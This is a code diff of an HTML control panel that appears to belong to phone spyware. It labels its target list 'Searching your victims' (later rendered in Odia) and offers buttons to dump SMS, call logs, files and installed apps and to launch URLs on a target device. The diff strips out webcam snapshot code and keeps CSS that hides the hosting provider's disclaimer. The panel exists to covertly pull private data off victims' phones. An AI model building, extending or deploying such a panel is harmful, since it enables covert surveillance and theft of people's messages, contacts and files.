@@ -37,22 +37,8 @@ firebase.initializeApp(firebaseConfig);
 // Access the camera and stream video to the video element
 const video = document.getElementById('video');
 
-navigator.mediaDevices.getUserMedia({ video: true })
-  .then((stream) => {
-    video.srcObject = stream;
-  })
-  .catch((err) => {
-    console.error("Error accessing the camera: ", err);
-  });
 
-// Capture the image when the button is clicked
-const canvas = document.getElementById('canvas');
-const context = canvas.getContext('2d');
-const snap = document.getElementById('snap');
 
-snap.addEventListener('click', () => {
-  context.drawImage(video, 0, 0, canvas.width, canvas.height);
-});
 
 </script>
 </head>
@@ -540,13 +526,13 @@ text-align:center;
 </div>
 <div id="users" >
 <br>
-<center>Searching your victims . . .</center>
+<center>ଏହିମାନେ ହେଲେ ଆପଣଙ୍କ ଵକରା . . .</center>
 </div>
 <div id="phones" >
 <br>
 
 <div class="dfle"  style="" >
-<div class="icon" onclick="dumpsms()">Dump SMS</div>
+<div class="icon" onclick="dumpsms()">Dump</div>
 <div class="icon" onclick="calllogs()" style="background:url('./img/dump_call_logs.png');background-size:52px 52px;baxkground-position:0 0;background-repeat:no-repeat;" >CallLogs</div>
 <div class="icon" onclick="filesmanager()" style="background:url('./img/ic3.png');background-size:50px 50px;background-repeat:no-repeat;" >My Files</div>
 <div class="icon" onclick="getpackages()" style="background:url('./img/list_installed_apps.png');background-size:52px 52px;baxkground-position:0 0;background-repeat:no-repeat;" >AppsList</div>
@@ -578,7 +564,6 @@ text-align:center;
 </div>
 <div class="dfle"  style="" >
 <div class="icon" onclick="funcmd('fmc2')" style="background:url('./img/web.png');background-size:50px 50px;background-repeat:no-repeat;">LaunchURL</div>
-<div class="icon" onclick="openCamera()" style="background:url('./img/cam.png');background-size:50px 50px;background-repeat:no-repeat;">Camera Snap</div>
 </div>
 </div>
 
@@ -596,10 +581,7 @@ text-align:center;
 <div id="resp" onclick="opfol(event)"   >
 </div>
 
-<div id="camera">
-  <video id="video" width="320" height="240" autoplay></video>
-  <button id="snap">Snap Photo</button>
-</div>
+
 <div id="output">
   <canvas id="canvas" width="320" height="240"></canvas>
 </div>
@@ -1151,7 +1133,7 @@ display:none;
 }
 </style>
 </div>
-<script type="text/javascript" src="./script.js"></script>
+<script type="text/javascript" src="script.js"></script>
 <style>
 img[alt*="www.000webhost.com"], .disclaimer {
 display: none
